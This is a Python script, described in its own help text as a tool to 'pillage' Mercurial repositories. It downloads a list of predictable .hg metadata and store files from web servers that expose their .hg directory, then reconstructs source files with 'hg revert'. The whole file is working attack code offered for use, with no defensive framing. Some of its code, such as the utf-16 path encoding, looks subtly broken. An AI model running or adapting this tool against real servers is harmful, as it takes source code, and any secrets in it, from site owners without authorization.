#!/usr/bin/python

import urllib
import subprocess
import argparse
import os
from urllib.parse import urlparse
from mercurial import store, commands, ui, hg


STATIC_FILES = [
    ".hg/00changelog.i",
    ".hg/dirstate",
    ".hg/requires",
    ".hg/branch",
    ".hg/branchheads.cache",
    ".hg/last-message.txt",
    ".hg/tags.cache",
    ".hg/undo.branch",
    ".hg/undo.desc",
    ".hg/undo.dirstate",
    ".hg/store/00changelog.i",
    ".hg/store/00changelog.d",
    ".hg/store/00manifest.i",
    ".hg/store/00manifest.d",
    ".hg/store/fncache",
    ".hg/store/undo",
    ".hg/.hgignore",
]

parser = argparse.ArgumentParser(description="Pillage a mercurial (HG) repository.")
parser.add_argument("url", nargs="+", help="base url e.g. http://example.com")
parser.add_argument("-f", "--file", help="Pillage single file")
args = parser.parse_args()

# Setup our base dir
URL = urlparse(args.url[0])
LOCAL_BASE_DIR = "%s" % (URL.hostname)
if URL.hostname != None:
    if not os.path.exists(LOCAL_BASE_DIR):
        os.makedirs(LOCAL_BASE_DIR)
else:
    print("URL does not have a hostname")


def get(filename, encode=False):
    if encode:
        filename = store.encodefilename(filename)
        print(filename)
    dir = os.path.join(LOCAL_BASE_DIR, os.path.dirname(filename))
    if not os.path.exists(dir):
        os.makedirs(dir)
    try:
        url = "%s/%s" % (URL.geturl(), filename)
        f = urllib.request.urlopen(url)
        local_file = open(os.path.join(LOCAL_BASE_DIR, filename), "w")
        local_file.write(f.read().decode("ISO-8859-1"))
        local_file.close()
    except urllib.error.HTTPError as e:
        print("HTTP ERROR:", e.code, url)
    except urllib.error.URLError as e:
        print("URL ERROR:", e.reason, url)


# 1 - Get predictable file names from the repo
print("Getting predictable files")
for filename in STATIC_FILES:
    if not os.path.exists(os.path.join(LOCAL_BASE_DIR, filename)):
        get(filename)
    else:
        print("Skipping file as it already exists: %s" % (filename))

# If we want a single file. Do that here. This code sucks and should be condensed at some point
if args.file:
    file = args.file
    filename = os.path.join(".hg/store/data/", store.encodefilename(file) + ".i")
    if not os.path.exists(os.path.join(LOCAL_BASE_DIR, filename)):
        get(filename)
        print("Getting %s" % (filename))
    else:
        print("Already exists, skipping %s" % (filename))

    # Ugly but I don't care right now (going for working, not pretty)
    filename = os.path.join(".hg/store/data/", store.encodefilename(file) + ".d")
    if not os.path.exists(os.path.join(LOCAL_BASE_DIR, filename)):
        get(filename)
        print("Getting %s" % (filename))
    else:
        print("Already exists, skipping %s" % (filename))

    # Try and restore the file. Dirty hack but whatever
    os.chdir(LOCAL_BASE_DIR)
    subprocess.call(["hg", "revert", file])
    os.chdir("..")
    exit(0)

# 2 - Get list of files
print(ui.ui(), LOCAL_BASE_DIR)
repo = hg.repository(ui.ui(), LOCAL_BASE_DIR.encode("utf-16"))


# 3 - ???

# 4 - Profit - Download data files and try to restore them
# TODO: Ask the user if they want to continue downloading X files

for file in repo.status().removed:
    filename = os.path.join(".hg/store/data/", store.encodefilename(file) + ".i")
    if not os.path.exists(os.path.join(LOCAL_BASE_DIR, filename)):
        get(filename)
        print("Getting %s" % (filename))
    else:
        print("Already exists, skipping %s" % (filename))

    # Ugly but I don't care right now (going for working, not pretty)
    filename = os.path.join(".hg/store/data/", store.encodefilename(file) + ".d")
    if not os.path.exists(os.path.join(LOCAL_BASE_DIR, filename)):
        get(filename)
        print("Getting %s" % (filename))
    else:
        print("Already exists, skipping %s" % (filename))

    # Try and restore the file. Dirty hack but whatever
    os.chdir(LOCAL_BASE_DIR)
    subprocess.call(["hg", "revert", file])
    os.chdir("..")
